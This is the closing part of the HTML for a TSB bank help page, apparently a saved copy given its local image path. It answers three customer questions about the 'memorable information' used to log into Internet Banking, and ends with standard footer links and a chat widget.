                                                                            inbentaid="eyJpdiI6InkwYm5Vek1sUTI2eGZ5VVlObHVaSEE9PSIsInZhbHVlIjoiQ3dDUVcrWjh4aGl6bnJqaEVrdzJjK0R5UVQ1N2pzS1EydmZrYlZmQ0RZTVJnbFNrYWN0ZVV1UHFXVHNvUU9MU3YxZ21kMklPUUZHM2tWZDRsbkxTSEE3dFwvRnVFdFwvV1doOHg4UjRJd3pGTnFpNHFSN2RsTFFWS3RUWkdScjJRZCIsIm1hYyI6IjA5MTVlZDE2NjZmNmM5MGIwYzZjZjJkNjlhMzJmNTMzNjU2MGI2YmMzMTU2NDJlNWNjZTMzNWQ2ODQ5OTQ1NmUifQ=="
                                                                            title="What if I&#39;ve forgotten my memorable information?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">What if I've forgotten my memorable information?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p>
                                                                                Go to the Internet Banking log on screen and click Having problems logging in?<br />
                                                                                Complete the online form, click 'Continue', then follow the on-screen instructions to get back online - not forgetting to make a note of any reference number we
                                                                                may give you. Please note, if you do not hold a TSB personal account, you will be sent a form in the post which you will need to sign and return to us.
                                                                            </p>
                                                                        </div>
                                                                    </li>
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6IjlpZWorMHVKVkJaMjZNTzA5ZGU2N1E9PSIsInZhbHVlIjoiR08zYytjbnNKeVdweFhadjd6Uk9VWkxidkxaUml2TFdpWk1tRUJFTGcycHlGRFU4UCtXY1pMWEFQUFFxSFVSSW12VmVtY0RjN0gxQkN0SWpqa3F3ZUtGdHJNWHpnckxVeElUa2tpWUNDN3IyRHY0NUxCMzdNVnhWcWxDbmtlZ2UiLCJtYWMiOiI1NTBkMTRiMDE2NjhkOGQ2MmJlNGRmMWY3YTZmNDgxNjU2MzNlMTYxMzc5YzRiMGJjN2U5YWQ5MDI0ODQ0YzEwIn0="
                                                                            title="What is Memorable Information?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">What is Memorable Information?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p>
                                                                                The first time you log into Internet Banking you are asked to select some Memorable Information. This will be a word, place or phrase that is easy for you to
                                                                                remember. Each time you log in you will be asked to provide 3 random characters from your Memorable Information. This information can be changed once you are
                                                                                logged on to Internet Banking.
                                                                            </p>
                                                                        </div>
                                                                    </li>
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6InN2dkQrblRZOVBUM3p2b3l6cUV2ckE9PSIsInZhbHVlIjoibkFFbGZ5WE1LRGZlamRncFkrVE1vZmpcL2VaVEN5UmloMzVlUmFTVzk1YjdDb0lpNnVJZW9yTVFpOFRYM1dUYmxIRFBZYWIrQ0R1YXdaMkptK1Y3MjF0YnAyZU1iNVVSTjdCYW5pMjExZ0tyOGpBWmxvWGthVERaOW9PamFEMVVZIiwibWFjIjoiNzNlODcxMDc3YmNlYzVjMTIyYTdhZDA1YzNhMzQwZDdmMjlmMGFkNTI5MTdkNjE0OTJlMmZkNTFhY2I4NjEyMiJ9"
                                                                            title="Why do I need memorable information?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">Why do I need memorable information?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p></p>
                                                                            <p>
                                                                                Your memorable information gives you extra protection from online fraud. We only ask for a few of the characters from your memorable information when you log
                                                                                in, which makes it more difficult for fraudsters to guess or capture your information.
                                                                            </p>
                                                                            <p></p>
                                                                        </div>
                                                                    </li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            
											
                                        </div>
                                        <div class="promotionalDefault" style="min-height: 4px;"></div>
                                        <div id="lateral-panel-content-3"></div>
                                        <div id="lateral-panel-content-4"></div>
                                        <div id="lateral-panel-content-5"></div>
                                        <div id="lateral-panel-content-6"></div>
                                        <div id="lateral-panel-content-7"></div>
                                        <div id="lateral-panel-content-8"></div>
                                        <div id="lateral-panel-content-9"></div>
                                        <div id="lateral-panel-content-10"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div id="spaHidden" style="display: none;"></div>
            <div id="experienceatfoot" class="col-md-12" style="z-index: 100; margin-bottom: 2px;"></div>

            <div class="footer-tsb">
                <div class="container">
                    <div class="outer">
                        <div class="row">
                            <div class="col-xs-12">
                                <div class="footerInner-tsb">
                                    <ul>
                                        <li>
                                            <a href="http://www.tsb.co.uk/legal/" target="_blank" title="Legal" class="">Legal</a>
                                        </li>
                                        <li>
                                            <a href="http://www.tsb.co.uk/privacy/" target="_blank" title="Privacy" class="">Privacy</a>
                                        </li>
                                        <li>
                                            <a href="http://www.tsb.co.uk/security/" target="_blank" title="Security" class="">Security</a>
                                        </li>
                                        <li>
                                            <a href="https://www.tsb.co.uk/help/rates-and-charges/" target="_blank" title="Rates and Charges" class="">Rates and Charges</a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="cms-backdrop" class="inactive"></div>

        
		
        <div
            id="LPMcontainer-1599873660496-0"
            class="LPMcontainer LPMoverlay"
            role="button"
            tabindex="0"
            style="
                margin: -131px 1px 1px auto;
                padding: 0px;
                border-style: solid;
                border-width: 0px;
                font-style: normal;
                font-weight: normal;
                font-variant: normal;
                list-style: outside none none;
                letter-spacing: normal;
                line-height: normal;
                text-decoration: none;
                vertical-align: baseline;
                white-space: normal;
                word-spacing: normal;
                background-repeat: repeat-x;
                background-position: left bottom;
                background-color: rgb(255, 255, 255);
                border-radius: 10px;
                width: 47px;
                height: 262px;
                cursor: pointer;
                display: block;
                z-index: 107158;
                position: fixed;
                top: 50%;
                bottom: auto;
                left: auto;
                right: 0px;
            "
        >
            <img
                src="./files/img/chat_floating.png"
                id="LPMimage-1599873660498-1"
                alt=""
                class="LPMimage"
                style="
                    margin: 0px;
                    padding: 0px;
                    border-style: none;
                    border-width: 0px;
                    font-style: normal;
                    font-weight: normal;
                    font-variant: normal;
                    list-style: outside none none;
                    letter-spacing: normal;
                    line-height: normal;
                    text-decoration: none;
                    vertical-align: baseline;
                    white-space: normal;
                    word-spacing: normal;
                    position: absolute;
                    top: -1px;
                    left: -1px;
                    z-index: 600;
                "
            />
        </div>
    </body>
</html>
